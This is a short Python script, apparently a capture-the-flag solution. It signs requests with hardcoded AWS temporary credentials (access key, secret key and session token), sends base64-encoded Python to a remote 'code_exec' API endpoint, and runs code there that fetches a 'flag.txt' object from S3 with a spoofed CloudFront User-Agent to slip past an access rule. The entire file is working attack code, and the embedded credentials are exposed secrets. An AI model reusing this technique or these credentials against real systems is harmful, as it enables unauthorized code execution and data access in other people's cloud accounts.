import base64
import requests
from aws_requests_auth.aws_auth import AWSRequestsAuth

auth = AWSRequestsAuth(aws_access_key="ASIARYWSMSYIMLIFTXQE",
                       aws_secret_access_key="2pFYytUGEJ61BMm0LEWESi0d71uWsf2TjoGpwObR",
                       aws_token="IQoJb3JpZ2luX2VjELb//////////wEaDGlsLWNlbnRyYWwtMSJGMEQCIDpaG+c2mutY4AeFGfNj7oLjQMeRIsmd0NuI37jMbzhrAiA0PNs5JJEosI8VsHZvtRtKgyq1OZfrfHIoOzZBoAugeyq1AggjEAAaDDEyMTc3NDA1Mjg4MCIMUFWh9GRVwObVUas1KpICQXRQ0m3on3qF93Q0rOaryZIVQNYEgWm6UKvUzYd+i/s6gHXodfCt1JKYpsPNqQ4gwrxvCKiP8Tr2f3tZ7Wox+TH2TTxNjYyzsDw3iedbCJp+5NXZ8xEerIpmIeyMKFM4s//Cn4k3i70ysMD3cgFkYX3A4EvOeP1bE0JukWRwJEGftHlKpmtYjijVGtGCu2bc58w9LTIRSsAztboEt4muWQ2xlNa5IYEXaciHoU3VnpkU537ZlGqpnO3MVyXukDhmj6wVhS231TXp1LS9FW9YirdqA1LU6JwCgGERQiC6FZte6VqeQW7/UvbgcIkTvUiYqHL/vzY6+TsoTNuYiqjJ0wrL4mp3FmMT5VSV6vyKEtD4FDDkhszTBjqeAd5NRHgUIjh1w6DyNpim5EeZx7ULUCpbxkUEwpyZRXQHtukm7sOeGsP4HSgp3/DvLu2pS+YhLlWx8ag+KoLE1WVynoEpjvNbG6NXlUK0eCsS81BdGTy0kHRdJCV36nZQLEdoDCPxjAZn4Nd0kihI9HU0k7EFKvtuQCtTf7B8hIydoVFQu/WMw3AAQRjYQyHDy58kBUo9u65TTgHWqZSg",
                       aws_host='l8ssyaz69f.execute-api.us-east-1.amazonaws.com',
                       aws_region='us-east-1',
                       aws_service='execute-api')

def execute_code(python_code):
    encoded_code = base64.b64encode(python_code.encode('utf-8')).decode('utf-8')
    payload = {"code": encoded_code}
    url = "https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec"
    response = requests.post(url, json=payload, auth=auth)
    return response.json()

if __name__ == "__main__":
    code = """
import urllib.request
import urllib.error

url = "https://s3.us-east-1.amazonaws.com/userd8a2f72fe43094e8/flag.txt"
req = urllib.request.Request(url, headers={"User-Agent": "cloudfront.net/docs.html"})
urllib.request.urlopen(req, timeout=5)
"""
    result = execute_code(code)
    print("Execution Result:", result)
